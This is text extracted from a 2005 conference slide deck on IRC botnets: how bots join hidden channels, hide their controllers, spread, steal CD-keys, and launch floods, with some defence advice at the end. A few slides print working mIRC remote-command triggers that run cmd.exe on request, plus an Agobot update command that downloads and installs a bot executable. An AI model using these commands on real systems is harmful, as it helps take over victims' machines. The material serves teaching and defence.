 Selling advertisements
 Manipulating online polls
 Sending Spammails
 Doing Phishing
 Renting bots
 Information lost / Identity theft / Sniffing
 Stealing CD-key,online-game goods ..
2005 July 16
Copyright PI:EMAIL
30
IRC and IRC bot
IRC is the earliest form of online chat.
 IRC (Internet Relay Chat) 1993
RFC 1459,2810,2811,2812,2813
Users can chat at channels in realtime.
 Channel management (RFC 2811) ,2000
Channel operator (+o)
Private (flag p) and Secret (flag s) Channels
Channel Topic (/topic #chan_name topic)
Channel key( +k)
Ban user
 CTCP/DCC (1994)
 An IRC bot writer should be very familiar with the IRC standards.
2005 July 16
Copyright PI:EMAIL
31
IRC and IRC bot (cont)
 IRC bot
A IRC client program which enforce channel policies.
 Ban users if they speak special keywords.
 Give the op to specific users/ Do User level management.
 Prevent flooding.
 React to certain events.
Eggdrop、Perlbot、ircII script bot、mIRC script…
 Advanced IRC bot
 P2P file sharing.
 Gamebot、Talkbot
 Google bot、Sysbot…
2005 July 16
Copyright PI:EMAIL
32
IRC and IRC bot (cont) 
- mirc bot examples 
Sysbot
/load -rs SystemInfo.mrc
/ctcp sysbot systeminfo
Google bot
P2P file sharing
2005 July 16
Copyright PI:EMAIL
33
What they do & How they work
- Inside the Bot IRC channel !!
1)
Connect to the bot controller(IRC server).
/sever xxx.xxx.xxx.xxx serverpass
2)
Enters specific channel with password, interprets its topic as command.
Bot list - Bots that perform the 
same action in the channel.
They are compromising other hosts by 
using MS-0411 LSASS vulnerability.
3)
Hacker can herd 
some bot to 
another channels 
or servers.
2005 July 16
Copyright PI:EMAIL
34
Inside the Bot IRC channel
- The IRC channel Bot joined
 When the Bots are connected to the IRC Server the 
channel they join is usually set with various channel 
modes to restrict access or help stealth the fact that 
the channel or the occupants of the channel are 
there. 
 +s (secret : cannot be seen in channels list)
 +u (userlist is hidden)
 +m (moderated : a user cannot send text to that channel 
unless they have operator @ access or +v voice)
 +k (cannot enter the channel unless you know the correct 
key)
2005 July 16
Copyright PI:EMAIL
35
Inside the Bot IRC channel !! (cont)
- Scanning and Spreading
2005 July 16
Copyright PI:EMAIL
36
Inside the Bot IRC channel !! (cont)
- Scanning for new vulnerabilities or victims
Scan for SWAT  (Samba Web Administration Tool) port 901
2005 July 16
Copyright PI:EMAIL
37
Tricks to hide Bot controller
- Dynamic DNS
Specific IRC servers are set in Bot.(Set up with 
domain name)
Bot owner uses Dynamic DNS .
Hiding controller and saving bandwidth
Bot will not connect to IRC server if 
1.
bot lost signal of network/can’t resolve server name.
2.
Bot resolve IRC server name to 0.0.0.0 or 127.0.0.1.
Bot
Bot
Bot controller
IRC server list
0.0.0.0
2005 July 16
Copyright PI:EMAIL
38
Tricks to hide Bot controller
- Bots change their controller
Hacker can change the controller when the victim has been found
Migration of bots
Time
Numbers of bots 
connect to the 
controller
2005 July 16
Copyright PI:EMAIL
39
Variants of Bots 
 Agobot/Phatbot/Gaobot/XtremBot
 Written in C++, module scalabilities
 Public in GPL,  lots of users improve its 
abilities and functions. powerful variants !
 Rootkit technologies to hide process
 Capabilities to detect debuggers..
written by Ago alias Wonk, a young German man who was arrested 
in May 2004 for computer crime.
 SDBot/RBot/UrBot/UrXBot/…
 Written in C, poor design..
2005 July 16
Copyright PI:EMAIL
40
Variants of Bots(cont)
 mIRC-based Bots - GT-Bots
 Launch an instance of the mIRC chat-client 
with a set of scripts(.mrc) and other binaries.
 .mrc is a powerful script that
 Can create socket,/exe,/dll…
 Following symptom are found.
 May use hidewindow to hide mIRC process.
 Change the filename of mIRC.exe (old version mIRC)
 DLL files are linked to mIRC for mIRC script.
2005 July 16
Copyright PI:EMAIL
41
Variants of Bots(cont)
- write your bot
mIRC script – remote event
The remote allows you to create scripts that react to IRC 
Server events
Advanced scripts
1.
2.
3.
on 1:TEXT:hello*:#:/msg $chan Welcome!!!! to $chan $nick!
example
ctcp ^*:DO:*:{ . $+ $2- | .halt } 
on 1:TEXT:cmd:#:/run cmd.exe
on 1:TEXT:dll:#:/dll run32.dll
on *:PART:#:{ .msg #noticechannel I have just parted $chan }
/ctcp alan DO run cmd
/ctcp alan DO run notepad c:\config.sys
2005 July 16
Copyright PI:EMAIL
42
Virus kit
Bot generator
2005 July 16
Copyright PI:EMAIL
43
Virus kit (cont)
Agobot Config GUI – configuration generator
2005 July 16
Copyright PI:EMAIL
44
Virus kit (cont)
VBS worm Generator
2005 July 16
Copyright PI:EMAIL
45
Functions inside a Bot
Bot should be designed in modular way. Easy to add new features.
Take Agobot as example
1.Sanner modules
2.Update modules
3.DoS modules
4.Harvest modules
5.3rd modules
2005 July 16
Copyright PI:EMAIL
46
Functions inside a Bot(cont)
 Scanner modules
 Scan and automated infection mechanism.
 Update modules
 Fetch newest bot program and install it automatically
‘.http.update http:///~location/xxxBot.exe c:\yyy.exe 1’
Agobot
Source code
2005 July 16
Copyright PI:EMAIL
47
Functions inside a Bot(cont)
Protect mechanism --- Rootkit:Hiding process
2005 July 16
Copyright PI:EMAIL
48
Functions inside a Bot(cont)
Bot.secure -> Fix vulnerabilities for you !!!
…
….
Close shares
Remove viruses
Disable Dcom
Why? -> Hacker Hijacks bots from another hacker
2005 July 16
Copyright PI:EMAIL
49
Functions inside a Bot(cont)
 DoS modules
 Syn,UDP,ICMP flood, password brute forcer, 
2005 July 16
Copyright PI:EMAIL
50
Functions inside a Bot (cont)
 Info stealing(Harvest) modules
 Harvest CD-Key, specific information, Sniffing,keylogger
CD-keys
Email harvest
2005 July 16
Copyright PI:EMAIL
51
Tracking and combating with 
Botnets
First, DDoS has no perfect solution! 
Second, know botnet ,know your ememy and then you might have the chance to 
survive.
Type 1 – some hosts in your Intranet are bots.
Bots connect to the same bot controller.
Channel signals still work 
Setting NIDS signatures in gateway area.
Channel signals stop
Setting NIDS signatures in DNS area.
Bots connect to several bot controllers.
Some of the Domain bot connects to you don’t  know. -> sniffer the DNS 
traffic and find out unusual query.
DNS
Intranet
2005 July 16
Copyright PI:EMAIL
52
Tracking and combating with 
Botnets(cont)
 When kick the bot out
The controller of a botnet has
to authenticate himself to 
take control over the bots.
 Type 2 – You are being DDoSed !
 Ask the ISP for help.
2005 July 16
Copyright PI:EMAIL
53
Tracking and combating with Botnets (cont) 
Release the bots?
 Is this possible? Hack into controller, give the 
command to stop the attack and release all bots?? 
(like Will Smith)
 Step 1: get the server/channel key from a compromised bot.
 Step 2: get the auth of botnet controller. 
 Wait for hacker.
 Tracing bot and system .
 Step 3: stop and release all bots??
→ You are also a hacker if you do so .
I,Robot,2004
??
2005 July 16
Copyright PI:EMAIL
54
Tracking and combating with 
Botnets (cont)
 Bot owner use MD5 storing the admin 
password, but
it can be sniffer unless using SSL encryption.
 IP ACL is used to limit the control src IP.
 It’s almost impossible.
2005 July 16
Copyright PI:EMAIL
55
Conclusion
 Active phishing scam (script injection) could be the 
new threat of phishing attack.
 Users need to be educated.( But…. )
 IRC will not be the only control machanism of botnet.
 Know your ememy than you will have chance to 
catch him.